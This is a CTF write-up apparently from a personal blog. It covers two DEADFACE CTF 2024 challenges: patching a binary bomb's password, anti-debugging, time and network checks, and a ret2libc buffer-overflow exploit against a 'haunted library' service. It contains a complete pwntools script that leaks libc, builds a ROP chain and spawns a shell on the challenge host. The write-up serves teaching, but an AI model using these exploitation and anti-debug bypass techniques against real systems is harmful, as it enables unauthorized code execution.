---
title: "DEADFACE CTF 2024: Binary Exploitation Challenges"
date: "2025-12-29"
excerpt: "Deep dives into two binary exploitation challenges from DEADFACE CTF 2024: reverse engineering a binary bomb and exploiting a buffer overflow in a haunted library system."
---

# Part 1: Bomb Challenge

![Binary prompt](/images/deadface-bomb/image-1.png)

So the binary prompts us for a password?

![Strings analysis](/images/deadface-bomb/image-2.png)

Using strings we can see that D34DC0DE is the password, but we'll need more than that.

Let's use objdump because why not and try to figure this out from the disassembly :)

Since, for comparing the password, the binary should use strcmp, so we'll try to search that in the objdump.

![strcmp in objdump](/images/deadface-bomb/image-3.png)

I'll try to break this down into what it means:

| Address | Instruction | What it does |
|---------|-------------|--------------|
| 0x1905 | `lea rdx, [rip + 0xb10]` | Load correct password address into `rdx` |
| 0x190c | `lea rax, [rbp - 0x12]` | Load user input address into `rax` |
| 0x1910 | `mov rdi, rax` | Set 1st argument = user input |
| 0x1913 | `mov rsi, rdx` | Set 2nd argument = correct password |
| 0x1916 | `call strcmp` | Compare the two strings |
| 0x191b | `test eax, eax` / `je 0x191d` | If equal, jump to success |
| 0x191f | `call explode` | Otherwise, bomb explodes |

Let's now dump the string at 0x241c and see.

```hex
Raw hex bytes at offset 0x241c:
  44 33 34 44 43 30 44 45  00 00 00 00 0A 4F 68 2C
```

which is hex for Deadcode.

![Objdump analysis](/images/deadface-bomb/image-4.png)

So let's look for what green wire and blue wire is.

After more investigating the objdump, we see that there are some more things we need to patch to get through:

- Password Check (requires input)
- Anti-Debugging Check (ptrace detection)
- Time Validation (year must be 1995)
- Network check?

Hmm so let's start with the 2nd since we already know the password.

## Anti-Debugging Check

**Option 1: Make ptrace check always return 0 (not debugged)**

Let's scan the objdump for ptrace which is the most common one, and we can see this:

```assembly
1784:   call   1341                    ; Call ptrace detection function
1789:   test   eax,eax                 ; Check return value
178b:   je     1793                    ; Jump if NOT being debugged (good)
178d:   call   13fc                    ; EXPLODE if being debugged

; Ptrace detection function at 0x1341:
1341:   push   rbp
1345:   mov    ecx,0x0
134a:   mov    edx,0x0
134f:   mov    esi,0x0
1354:   mov    edi,0x0
1359:   mov    eax,0x0
135e:   call   1060 <ptrace@plt>       ; Call ptrace
1363:   cmp    rax,0xffffffffffffffff  ; Compare with -1
1367:   sete   al                      ; Set AL=1 if debugger detected
136a:   movzx  eax,al
136d:   ret
```

Uhm so we can do 3 things here actually and they should all work!

Make ptrace check always return 0, Skip the bomb explosion check, NOP out the entire check.

Let's make ptrace return 0 because it's more fun.

```asm
Address: 0x1367
Original: 0f 94 c0          (sete al)
Patched:  31 c0 90          (xor eax,eax; nop)
→ Always returns 0
```

What this means is that `sete al` is a conditional instruction that sets the low byte `al` to 1 if the Zero Flag (ZF) is set, otherwise it sets it to 0. In this case, it means `al = (ZF ? 1 : 0)`.

This would make the function return 1 or 0 depending on whether the comparison was true. In my patch, I replaced `0f 94 c0` (`sete al`) with `31 c0 90` (`xor eax, eax; nop`), which forces `eax` to always be 0. That means the function will now always return 0—essentially making it always think it's *not being debugged*.

Other options are much simpler:

**Option 2: Skip the bomb explosion check**
```asm
Address: 0x178b
Original: 74 06             (je 1793)
Patched:  90 90             (nop; nop)
→ Always jump to success path ehe
```

**Option 3: NOP out the entire check**
```asm
Address: 0x1784 (5 bytes)
Original: e8 b8 fb ff ff    (call 1341)
Patched:  90 90 90 90 90    (5 NOPs)

Address: 0x1789 (2 bytes)
Original: 85 c0             (test eax,eax)
Patched:  90 90             (nop nop)
```

## Time Validation Check

Now that's done, let's move onto the next one which is the time validation.

Investigating time in the objdump we get:

```assembly
15bf:   call   1040 <localtime@plt>    ; Get current time
15cf:   call   1070 <time@plt>
15d4:   mov    rax,QWORD PTR [rbp-0x10]
15d8:   mov    eax,DWORD PTR [rax+0x14]  ; Get tm_year field (offset 0x14)
15db:   cmp    eax,0x5f                  ; Compare with (year 1995)
15de:   jne    1614                      ; Jump to FAILURE if not 1995
15e0:   ; Success path - XOR decrypt string
15f4:   lea    rax,[rip+0x4ab5]          ; Load string at 0x60b0
1600:   mov    esi,0xffffffde            ; XOR key = 0xDE
1603:   call   14f2                      ; Call XOR function
1608:   mov    DWORD PTR [rip+0x4ada],0x1  ; Set flag at 0x60ec = 1
1614:   ; Failure path
1614:   call   13fc                      ; KABBOMMMMMM
```

We have a plethora of options here. One way would be to check and manually set the success flag:

```asm
Address: 0x60ec (in .bss section)
Original: 00 00 00 00
Patched:  01 00 00 00
Effect: Pretend time check already passed
```

Some other ways would be:

I could just force the program to always take the success path. At address `0x15de`, I replaced `75 34` (`jne 1614`) with `90 90` (`nop nop`), which removes the jump entirely so it never goes to the failure branch and always runs the success code.

Another approach was to change the comparison itself so it matches the current year. The original instruction `cmp eax,0x5f` checked for 1995, but I patched it to `cmp eax,0x7d`, making it accept 2025 instead.

I could just skip the whole check altogether. At address `0x15d8`, I NOP'd out seven bytes (`90 90 90 90 90 90 90`), removing the `mov`, `cmp`, and `jne` instructions entirely so the validation never even happens.

## Network Check

Next and the last one is a Network related check (Address: 0x1796). It does:
- Uses libcurl to make HTTP request
- Checks if curl connection succeeds
- Explodes if network fails
- If successful, XOR-decrypts string with key 0xAD

```assembly
17cb:   call   10c0 <curl_easy_init@plt>    ; Initialize curl
17d0:   mov    QWORD PTR [rbp-0x8],rax
17d4:   cmp    QWORD PTR [rbp-0x8],0x0      ; Check if init succeeded
17d9:   je     1865                          ; Skip if failed
17df:   lea    rdx,[rip+0xb5e]              ; URL string at 0x2344
17f7:   call   1090 <curl_easy_setopt@plt>  ; Set URL
1812:   call   1090 <curl_easy_setopt@plt>  ; Set options
181e:   call   10d0 <curl_easy_perform@plt> ; Perform request
1823:   mov    DWORD PTR [rbp-0xc],eax      ; Store result
1826:   cmp    DWORD PTR [rbp-0xc],0x0      ; Check if succeeded (0 = success)
182a:   jne    1833                          ; Jump if failed
182c:   call   13fc                          ; EXPLODE (lol this is inverted)
1831:   jmp    1866
1833:   ; Failure handling
1847:   lea    rax,[rip+0x4882]             ; String at 0x60d0
184e:   mov    esi,0xffffffad               ; XOR key = 0xAD
1853:   call   14f2                          ; XOR decrypt
185b:   mov    DWORD PTR [rip+0x488b],0x1   ; Set flag at 0x60f0 = 1
```

A funny thing is the logic is INVERTED! It explodes on success (0), not failure!

I've got four ways to bypass the network check:

**Option 1: Invert the comparison**
At 0x182a change `75 07` (jne 0x1833) to `74 07` (je 0x1833). That flips the branch logic so success becomes failure and failure becomes success.

**Option 2: Skip the network check entirely**
NOP'd out the call at 0x17cb (e8 f0 f8 ff ff -> 90 90 90 90 90) so the network routine never runs, and I also NOP'd the following compare/jump at 0x17d4 (48 83 7d f8 00 0f 84 -> seven 90s) so the code never performs the check.

**Option 3: Manually set the success flag**
Modify a 4-byte value in .bss at 0x60f0 from 00 00 00 00 to 01 00 00 00. That makes the program think the network check already passed. (this crashed, no idea)

**Option 4: NOP the explosion call**
At 0x182c, replaced the call instruction e8 cb fb ff ff with 90 90 90 90 90, preventing the failure/explode routine from being invoked.

Since we have the original offsets locally and everything locally, hex edit the addresses and patch it :)

```text
Offset    Original         Patched          Description
------    --------         -------          -----------
0x1367    0F 94 C0         31 C0 90         Phase 2: xor eax,eax
0x15DE    75 34            90 90            Phase 4: NOP jne
0x182A    75 07            74 07            Phase 5: jne→je
```

And boom we got the flag :)

![Success](/images/deadface-bomb/image-5.png)

![Flag](/images/deadface-bomb/image-6.png)

---

# Part 2: Haunted Library Challenge

## Challenge Description

A mysterious library system awaits... Can you uncover its secrets?

**Connection Details:**
```bash
nc env02.deadface.io 7832
```

**Files Provided:**
- `hauntedlibrary` - The vulnerable binary
- `libc.so.6` - The libc library
- `ld-linux-x86-64.so.2` - The dynamic linker

## Initial Analysis

First we should actually run checksec to see:

```bash
$ checksec hauntedlibrary
[*] 'hauntedlibrary'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    RUNPATH:    b'.'
    Stripped:   No
```

Mhmm so some stuff to note from checksec is:
- **No Stack Canary** - Stack buffer overflows are exploitable
- **NX Enabled** - We can't execute shellcode on the stack (need ROP)
- **No PIE** - Binary addresses are predictable/static
- **Partial RELRO** - GOT is writable, but we'll use ROP instead
- **Not Stripped** - Function names are available for analysis

Enough static analysis, let's try running the binary:

```bash
$ ./hauntedlibrary

░░░░░░░░░░░░░░░░░░▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
Welcome to the Haunted Library...
where every book has a story to tell, and some secrets are better left unread.

1. Browse available books
2. Check out a book
3. Exit

>
```

It has a menu system where you can browse books, check out a book, and exit.

## Reverse Engineering

Since we have the static stuff out of the way, let's see the pseudo code in Ghidra.

Loading the binary into Ghidra, we identify several key functions:

### Main Function

```c
void main(void) {
    int choice;
    
    setup();
    banner();
    
    while (true) {
        menu();
        scanf("%d", &choice);
        
        switch(choice) {
            case 1:
                browse_books();
                break;
            case 2:
                check_out();
                break;
            case 3:
                exit(0);
            default:
                puts("Invalid choice!");
        }
    }
}
```

### The Vulnerability

The `check_out()` function at `0x4013e7` contains our vulnerability:

```c
void check_out(void)
{
    char book_name[80];  // 80-byte buffer
    
    puts("Which book would you like to check out?");
    printf("> ");
    gets(book_name);  //  No bounds checking! ehee
    
    if (strcmp(book_name, "BookOfTheDead") == 0) {
        book_of_the_dead();
    } else {
        printf("You could have sworn you saw a book called '%s'...\n", book_name);
        puts("but as you look closer, it was nowhere to be found.");
    }
}
```

 The `gets()` function reads unlimited input into an 80-byte buffer, allowing a classic stack overflow!

Also another thing I found in Ghidra was:

`book_of_the_dead()` at `0x40174f`:

```c
void book_of_the_dead(void) {
    long puts_addr = (long)&puts;
    printf("puts(): 0x%lx\n", puts_addr);
}
```

Oh we get the puts from libc, so we can bypass ASLR and construct a ROP chain and we can also get the libc base and get values of other functions, like system for example.

## Exploitation Strategy

So far my thought process is to:

1. Overflow the buffer to call a leak stage (e.g. `puts(puts@got)` or `book_of_the_dead()`), return to `main`
2. Parse the leaked `puts` to compute `libc_base`
3. Find `system` and `"/bin/sh"` offsets
4. Send a second ROP payload using `pop rdi; ret` to call `system("/bin/sh")` and spawn a shell to read the flag

## Finding the Offset

Using pwntools' `cyclic` pattern to find the exact offset to the return address:

```python
from pwn import *

p = process('./hauntedlibrary')
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'> ', cyclic(200))
```

Running in GDB:
```bash
$ gdb ./hauntedlibrary
gdb> run
# ... crash ...
gdb> x/wx $rsp
0x6161616c  # "laaa" in cyclic pattern
```

```python
>>> from pwn import cyclic_find
>>> cyclic_find(0x6161616c)
88
```

**The return address is at offset 88 bytes!**

## Stage 1: Leaking Libc

```python
from pwn import *

# Addresses
BOOK_OF_THE_DEAD = 0x40174f
MAIN = 0x401226

# Connect
p = remote('env02.deadface.io', 7832)

# Navigate to check_out
p.recvuntil(b'> ')
p.sendline(b'2')
p.recvuntil(b'> ')

# Overflow to call book_of_the_dead, then return to main
payload1 = flat([
    b'A' * 88,           # Fill buffer up to return address
    BOOK_OF_THE_DEAD,    # Call book_of_the_dead()
    MAIN                 # Return to main() for round 2
])

p.sendline(payload1)

# Parse the leak
p.recvuntil(b'puts(): ')
leak_line = p.recvline().decode()
match = re.search(r'(0x[0-9a-fA-F]+)', leak_line)
leak = int(match.group(1), 16)
```

LIBC base would be:

```python
libc = ELF('./libc.so.6')

# Calculate base address
libc.address = leak - libc.symbols['puts']

print(f"[+] Leaked puts(): {hex(leak)}")
print(f"[+] Libc base: {hex(libc.address)}")
```

## Understanding x86-64 Calling Convention

Before building our ROP chain, I'll try to explain what ROP gadgets we need etc and why and where to use them.

In **x86-64 (64-bit) Linux**, function arguments are passed through **registers** in this specific order:

| Argument | Register |
|:--------:|:--------:|
| 1st | **RDI** |
| 2nd | RSI |
| 3rd | RDX |
| 4th | RCX |
| 5th | R8 |
| 6th | R9 |
| 7th+ | Stack |

Our goal is to call:
```c
int system(const char *command);
//         ^^^^^^^^^^^^^^^^^^
//         First argument → Must be in RDI!
```

We want: `system("/bin/sh")`

So we need to load the address of the string `"/bin/sh"` into **RDI** before calling `system()`. :)

## Finding ROP Gadgets

We need two gadgets:

1. **`pop rdi; ret`** - Pops a value from the stack into RDI
   ```asm
   pop rdi    ; RDI = [stack pointer], then SP += 8
   ret        ; RIP = [stack pointer], then SP += 8
   ```

2. **`ret`** - Just returns (used for stack alignment)
   ```asm
   ret        ; RIP = [stack pointer], then SP += 8
   ```

Let's find using ROPgadget tool:

```python
# Using ROPgadget or ropper
$ ROPgadget --binary libc.so.6 | grep "pop rdi"
0x00000000000102dea : pop rdi ; ret

$ ROPgadget --binary libc.so.6 | grep ": ret$"
0x0000000000024578 : ret
```

```python
pop_rdi = libc.address + 0x102dea
ret_gadget = libc.address + 0x24578
```

## Stage 2: Building the ROP Chain

Now that's done let's build a ROP chain:

```python
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh\x00'))

payload2 = flat([
    b'A' * 88,      # Fill buffer to return address
    ret_gadget,     # Stack alignment (system needs 16-byte aligned stack)
    pop_rdi,        # Pop next value into RDI
    binsh,          # Address of "/bin/sh" string
    system          # Call system("/bin/sh")
])
```

### Why Stack Alignment Matters

Modern libc functions (especially `system()`) expect the stack to be **16-byte aligned**. The extra `ret` gadget ensures proper alignment, preventing crashes.

Without alignment:
```text
Stack pointer: 0x7fffffffe3d8  ← Not 16-byte aligned
system() crashes with SIGSEGV
```

With alignment:
```text
ret gadget pops once → Stack pointer: 0x7fffffffe3e0  ← 16-byte aligned!
system() executes successfully
```

## Final Exploit Code

```python
from pwn import *
import re

# Load binaries
exe = ELF('./hauntedlibrary_patched')
libc = ELF('./libc.so.6')

context.binary = exe
context.log_level = 'info'

print("="*60)
print("DEADFACE CTF - Haunted Library Exploit")
print("="*60)

# Stage 1: Get libc leak
print("\n[*] Stage 1: Getting libc leak...")
p = remote('env02.deadface.io', 7832)

p.recvuntil(b'> ')
p.sendline(b'2')  # Check out
p.recvuntil(b'> ')

# Overflow to call book_of_the_dead, then return to main
payload1 = b'A' * 88 + p64(0x40174f) + p64(0x401226)
p.sendline(payload1)

# Parse the leaked address
p.recvuntil(b'nowhere to be found')
p.recvuntil(b'puts(): ')
leak_line = p.recvline().decode()

# Extract hex address (ignore Unicode garbage)
match = re.search(r'(0x[0-9a-fA-F]+)', leak_line)
leak = int(match.group(1), 16)

# Calculate libc base
libc.address = leak - libc.symbols['puts']

# Find what we need
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh\x00'))
pop_rdi = libc.address + 0x102dea
ret_gadget = libc.address + 0x24578

print(f"[+] Leaked puts(): {hex(leak)}")
print(f"[+] Libc base: {hex(libc.address)}")
print(f"[+] system(): {hex(system)}")
print(f"[+] /bin/sh: {hex(binsh)}")
print(f"[+] pop rdi: {hex(pop_rdi)}")

# Stage 2: Get shell
print("\n[*] Stage 2: Getting shell...")

p.recvuntil(b'> ')
p.sendline(b'2')  # Check out again
p.recvuntil(b'> ')

# ROP chain to call system("/bin/sh")
payload2 = flat([
    b'A' * 88,
    ret_gadget,    # Stack alignment
    pop_rdi,       # Pop next value into RDI
    binsh,         # "/bin/sh" address
    system         # system() address
])

p.sendline(payload2)
sleep(1)

# Get the flag
print("[*] Reading flag...")
p.sendline(b'cat BookOfTheDead.txt')

output = p.recvall(timeout=3)

print("\n" + "="*60)
print("FLAG:")
print("="*60)
print(output.decode())
print("="*60)
```

## Result

```bash
$ python exploit.py
============================================================
DEADFACE CTF - Haunted Library Exploit
============================================================

[*] Stage 1: Getting libc leak...
[+] Opening connection to env02.deadface.io on port 7832: Done
[+] Leaked puts(): 0x7dd673e9bc80
[+] Libc base: 0x7dd673e19000
[+] system(): 0x7dd673e6cb00
[+] /bin/sh: 0x7dd673fc9ebc
[+] pop rdi: 0x7dd673f1bdea

[*] Stage 2: Getting shell...
[*] Reading flag...
[+] Receiving all data: Done

============================================================
FLAG:
============================================================
deadface{TH3_L1BR4RY_KN0W5_4LL}
============================================================
```
